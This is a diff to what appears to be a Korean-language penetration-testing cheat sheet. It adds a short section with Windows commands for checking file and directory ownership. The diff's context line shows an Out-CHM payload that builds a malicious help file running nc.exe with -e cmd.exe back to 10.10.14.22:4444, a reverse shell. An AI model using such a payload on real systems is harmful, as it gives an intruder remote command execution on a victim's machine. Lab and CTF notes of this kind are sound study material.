@@ -715,3 +715,16 @@ Out-CHM -Payload "c:\users\chris\downloads\nc.exe 10.10.14.22 4444 -e cmd.exe" -
 <img width="1202" height="180" alt="image" src="https://github.com/user-attachments/assets/85ddee70-f086-41d8-a67d-2fe29b1fd8d5" />
 
 </details>
+
+---
+<details>
+ <summary><strong>소유주 확인</strong></summary>
+
+```cmd
+dir /q <directory>
+```
+```powershell
+(Get-Acl "C:\inetpub\development").Owner
+```
+ 
+</details>
